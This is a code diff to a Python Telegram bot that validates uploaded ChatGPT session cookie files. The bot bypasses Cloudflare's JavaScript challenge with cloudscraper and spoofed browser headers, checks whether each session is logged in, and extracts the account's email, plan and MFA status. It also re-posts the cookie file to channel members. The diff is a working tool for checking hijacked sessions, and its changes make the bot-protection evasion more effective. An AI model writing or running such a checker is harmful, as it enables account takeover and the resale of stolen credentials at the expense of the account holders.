@@ -11,6 +11,8 @@ from datetime import datetime, timezone
 
 import cloudscraper
 import certifi
+import requests
+from requests.cookies import create_cookie
 from dotenv import load_dotenv
 from telegram import Update, Document, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -21,12 +23,12 @@ from telegram.ext import (
     ContextTypes,
 )
 
-# Load environment variables
+# --- Configuration & Logging ---
 load_dotenv()
-TELEGRAM_TOKEN       = os.getenv("TELEGRAM_TOKEN")
-OWNER_CHAT_ID        = os.getenv("OWNER_CHAT_ID")
-CHANNEL_CHAT_ID      = os.getenv("CHANNEL_CHAT_ID")
-CHANNEL_INVITE_LINK  = os.getenv("CHANNEL_INVITE_LINK")
+TELEGRAM_TOKEN      = os.getenv("TELEGRAM_TOKEN")
+OWNER_CHAT_ID       = os.getenv("OWNER_CHAT_ID")
+CHANNEL_CHAT_ID     = os.getenv("CHANNEL_CHAT_ID")
+CHANNEL_INVITE_LINK = os.getenv("CHANNEL_INVITE_LINK")
 if not (TELEGRAM_TOKEN and OWNER_CHAT_ID and CHANNEL_CHAT_ID and CHANNEL_INVITE_LINK):
     logging.error("Please set TELEGRAM_TOKEN, OWNER_CHAT_ID, CHANNEL_CHAT_ID, and CHANNEL_INVITE_LINK in your .env")
     exit(1)
@@ -36,6 +38,10 @@ CHANNEL_CHAT_ID = int(CHANNEL_CHAT_ID)
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# URL we never change
+CHATGPT_URL = "https://chatgpt.com"
+
+# Realistic Linux‐Chrome headers
 DEFAULT_HEADERS = {
     "User-Agent": (
         "Mozilla/5.0 (X11; Linux x86_64) "
@@ -47,14 +53,26 @@ DEFAULT_HEADERS = {
         "q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
     ),
     "Accept-Language": "en-US,en;q=0.9",
+    "Referer": "https://chatgpt.com/",
+    "Origin": "https://chatgpt.com",
+    "DNT": "1",
     "Connection": "keep-alive",
     "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-User": "?1",
+    "Sec-Fetch-Dest": "document",
+    "sec-ch-ua": '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": '"Linux"',
 }
 
+# --- Helpers ---
 async def get_channel_invite_link(context):
     return CHANNEL_INVITE_LINK
 
 def parse_cookies(file_content: str, file_type: str) -> dict:
+    # support JSON array, Netscape format, or "k=v; k2=v2"
     if file_type.lower() == 'json' or file_content.lstrip().startswith('['):
         try:
             arr = json.loads(file_content)
@@ -82,12 +100,12 @@ def parse_cookies(file_content: str, file_type: str) -> dict:
 
     return cookies
 
+# --- Bot Handlers ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.message.from_user
-    user_id = user.id
     full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
     try:
-        member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user_id)
+        member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user.id)
         if member.status in ('member','administrator','creator'):
             await update.message.reply_text(
                 f"👋 Hi {full_name}! Send me your ChatGPT‐cookies file(s) (.txt, .json, or .zip), and I’ll check whether they’re still valid.",
@@ -109,12 +127,12 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     doc: Document = update.message.document
     orig_id = update.message.message_id
     user = update.message.from_user
-    user_id = user.id
     full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
     username_str = f"@{user.username}" if user.username else "N/A"
 
+    # enforce channel membership
     try:
-        member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user_id)
+        member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user.id)
         if member.status not in ('member','administrator','creator'):
             raise Exception()
     except:
@@ -126,6 +144,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_to_message_id=orig_id
         )
 
+    # download the file
     file = await doc.get_file()
     data = await file.download_as_bytearray()
     buf = io.BytesIO(data)
@@ -134,8 +153,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ext = os.path.splitext(fn)[1].lower()
     cookie_files = []
 
-    if ext in ('.txt','.json'):
-        txt = buf.read().decode('utf-8','ignore')
+    if ext in ('.txt', '.json'):
+        txt = buf.read().decode('utf-8', 'ignore')
         cookie_files.append((fn, txt, ext.lstrip('.')))
     elif ext == '.zip':
         with zipfile.ZipFile(buf) as zf:
@@ -143,14 +162,20 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 base = os.path.basename(zi.filename)
                 if zi.filename.startswith('__MACOSX/') or base.startswith('._'):
                     continue
-                if zi.filename.lower().endswith(('.txt','.json')):
-                    txt = zf.read(zi).decode('utf-8','ignore')
+                if zi.filename.lower().endswith(('.txt', '.json')):
+                    txt = zf.read(zi).decode('utf-8', 'ignore')
                     cookie_files.append((zi.filename, txt, zi.filename.split('.')[-1]))
     else:
-        return await update.message.reply_text("⚠️ Unsupported file type. Use .txt, .json or .zip.", reply_to_message_id=orig_id)
+        return await update.message.reply_text(
+            "⚠️ Unsupported file type. Use .txt, .json or .zip.",
+            reply_to_message_id=orig_id
+        )
 
     if not cookie_files:
-        return await update.message.reply_text("🚫 No .txt/.json cookie files found.", reply_to_message_id=orig_id)
+        return await update.message.reply_text(
+            "🚫 No .txt/.json cookie files found.",
+            reply_to_message_id=orig_id
+        )
 
     for name, content, ftype in cookie_files:
         context.application.create_task(
@@ -161,24 +186,25 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 content=content,
                 ftype=ftype,
                 bot_user=context.bot.username,
-                user_id=user_id,
+                user_id=user.id,
                 full_name=full_name,
                 username_str=username_str,
                 context=context
             )
         )
 
+# --- Core Processing ---
 async def process_file(
-    chat_id:int,
-    orig_id:int,
-    name:str,
-    content:str,
-    ftype:str,
-    bot_user:str,
-    user_id:int,
-    full_name:str,
-    username_str:str,
-    context:ContextTypes.DEFAULT_TYPE
+    chat_id: int,
+    orig_id: int,
+    name: str,
+    content: str,
+    ftype: str,
+    bot_user: str,
+    user_id: int,
+    full_name: str,
+    username_str: str,
+    context: ContextTypes.DEFAULT_TYPE
 ):
     cookies = parse_cookies(content, ftype)
     if not cookies:
@@ -188,26 +214,32 @@ async def process_file(
             reply_to_message_id=orig_id
         )
 
+    # 1) Create CloudScraper session
     scraper = cloudscraper.create_scraper(
         browser={'browser':'chrome','platform':'linux'},
-        delay=5
+        delay=10,    # up to 10s for JS challenge
+        debug=False
     )
     scraper.verify = certifi.where()
-    scraper.cookies.update(cookies)
     scraper.headers.update(DEFAULT_HEADERS)
 
     try:
         loop = asyncio.get_running_loop()
-        def fetch():
-            return scraper.get(
-                "https://chatgpt.com",
-                headers=DEFAULT_HEADERS,
-                timeout=30,
-                allow_redirects=True
-            )
-        resp = await loop.run_in_executor(None, fetch)
-        html = resp.text
 
+        # 2) Warm up: solve CF JS challenge and get cf_clearance
+        await loop.run_in_executor(None, scraper.get, CHATGPT_URL)
+
+        # 3) Inject user cookies with explicit domain/path
+        for k, v in cookies.items():
+            c = create_cookie(name=k, value=v, domain="chatgpt.com", path="/", secure=True)
+            scraper.cookies.set_cookie(c)
+
+        # 4) Fetch again with both cf_clearance + user cookies
+        resp = await loop.run_in_executor(None, scraper.get, CHATGPT_URL)
+        html = resp.text
+        status = resp.status_code
+
+        # 5) Parse embedded JS payload
         m = re.search(r'streamController\.enqueue\("(.+?)"\)', html, re.DOTALL)
         if m:
             js_escaped = m.group(1)
@@ -218,6 +250,7 @@ async def process_file(
             js_payload = js_payload.replace('\\"', '"')
             valid = '"authStatus","logged_in"' in js_payload
         else:
+            js_payload = ""
             valid = False
 
     except Exception as e:
@@ -233,17 +266,19 @@ async def process_file(
         logger.error(f"Error fetching ChatGPT: {e}\n{tb}")
         return
 
-    # ---- Simplified invalid‐cookie response ----
     if not valid:
+        snippet = html[:500].replace('\n', ' ')
         await context.bot.send_message(
             chat_id,
-            text="❌ This cookie is invalid or expired.",
+            text=(
+                f"❌ This cookie is invalid or expired. (HTTP {status})\n\n"
+                f"Response snippet:\n{snippet}"
+            ),
             reply_to_message_id=orig_id
         )
         return
-    # --------------------------------------------
 
-    # extract account info
+    # --- Extract account info ---
     m_email = re.search(r'"email"\s*,\s*"([^"]+)"', js_payload)
     if m_email and '@' in m_email.group(1):
         email = m_email.group(1)
@@ -267,7 +302,7 @@ async def process_file(
     m_mfa = re.search(r'"mfa"\s*,\s*(true|false)', js_payload)
     mfa = m_mfa.group(1).title() if m_mfa else "N/A"
 
-    # send success result
+    # --- Send results ---
     buf2 = io.BytesIO(content.encode('utf-8'))
     buf2.seek(0)
     tag = f"@{bot_user}-{orig_id}{os.path.splitext(name)[1].lower()}"
@@ -305,6 +340,7 @@ async def process_file(
         parse_mode='HTML'
     )
 
+# --- Entry Point ---
 def main():
     app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
